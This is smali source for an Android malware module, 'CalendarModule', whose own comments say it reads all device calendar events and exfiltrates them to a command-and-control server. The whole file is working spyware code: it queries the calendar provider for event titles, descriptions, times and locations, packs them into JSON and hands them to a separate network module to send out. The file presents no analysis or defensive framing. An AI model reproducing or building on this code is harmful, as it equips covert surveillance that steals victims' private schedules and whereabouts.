.class public Lcom/smilex/enhanced/modules/CalendarModule;
.super Ljava/lang/Object;
.source "CalendarModule.java"

# Reads device calendar events and exfiltrates them to C2.
# Ported from hwapp391 c/c/c/b.java (ObClnd - Calendar Observer).
# Queries content://com.android.calendar/events for all upcoming events.

.field private static sContext:Landroid/content/Context;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static init(Landroid/content/Context;)V
    .registers 2
    sput-object p0, Lcom/smilex/enhanced/modules/CalendarModule;->sContext:Landroid/content/Context;
    return-void
.end method

# Read all calendar events and send to C2
.method public static syncCalendar()V
    .registers 14
    :try_start
    sget-object v0, Lcom/smilex/enhanced/modules/CalendarModule;->sContext:Landroid/content/Context;
    if-eqz v0, :return_void

    # Build URI: content://com.android.calendar/events
    const-string v1, "content://com.android.calendar/events"
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v1

    # Projection columns
    const/4 v2, 0x6
    new-array v2, v2, [Ljava/lang/String;
    const/4 v3, 0x0
    const-string v4, "_id"
    aput-object v4, v2, v3
    const/4 v3, 0x1
    const-string v4, "title"
    aput-object v4, v2, v3
    const/4 v3, 0x2
    const-string v4, "description"
    aput-object v4, v2, v3
    const/4 v3, 0x3
    const-string v4, "dtstart"
    aput-object v4, v2, v3
    const/4 v3, 0x4
    const-string v4, "dtend"
    aput-object v4, v2, v3
    const/4 v3, 0x5
    const-string v4, "eventLocation"
    aput-object v4, v2, v3

    # Query: events from now onwards
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v3
    const/4 v4, 0x0  # selection
    const/4 v5, 0x0  # selectionArgs
    const-string v6, "dtstart ASC"
    const-string v7, ""  # placeholder for /range alignment
    invoke-virtual/range {v3 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v3

    if-eqz v3, :return_void

    # Build JSON array of events
    new-instance v4, Lorg/json/JSONArray;
    invoke-direct {v4}, Lorg/json/JSONArray;-><init>()V

    :loop_start
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z
    move-result v5
    if-eqz v5, :loop_end

    new-instance v6, Lorg/json/JSONObject;
    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    # id
    const/4 v7, 0x0
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getLong(I)J
    move-result-wide v8
    const-string v7, "id"
    invoke-virtual {v6, v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    # title
    const/4 v7, 0x1
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v7
    if-eqz v7, :skip_title
    const-string v8, "title"
    invoke-virtual {v6, v8, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    const/4 v7, 0x1  # reset v7 for later use
    :skip_title

    # description
    const/4 v7, 0x2
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v7
    if-eqz v7, :skip_desc
    const-string v8, "description"
    invoke-virtual {v6, v8, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    const/4 v7, 0x2  # reset v7 for later use
    :skip_desc

    # dtstart
    const/4 v7, 0x3
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getLong(I)J
    move-result-wide v8
    const-string v10, "dtstart"
    invoke-virtual {v6, v10, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    # dtend
    const/4 v7, 0x4
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getLong(I)J
    move-result-wide v8
    const-string v10, "dtend"
    invoke-virtual {v6, v10, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    # location
    const/4 v7, 0x5
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v7
    if-eqz v7, :skip_loc
    const-string v8, "location"
    invoke-virtual {v6, v8, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    const/4 v7, 0x5  # reset v7 for later use
    :skip_loc

    invoke-virtual {v4, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    goto :loop_start

    :loop_end
    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    # Send to C2
    invoke-virtual {v4}, Lorg/json/JSONArray;->toString()Ljava/lang/String;
    move-result-object v5
    const-string v6, "calendar"
    invoke-static {v6, v5}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V

    :return_void
    return-void
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    :error
    move-exception v0
    const-string v1, "CalendarModule"
    const-string v2, "syncCalendar failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method
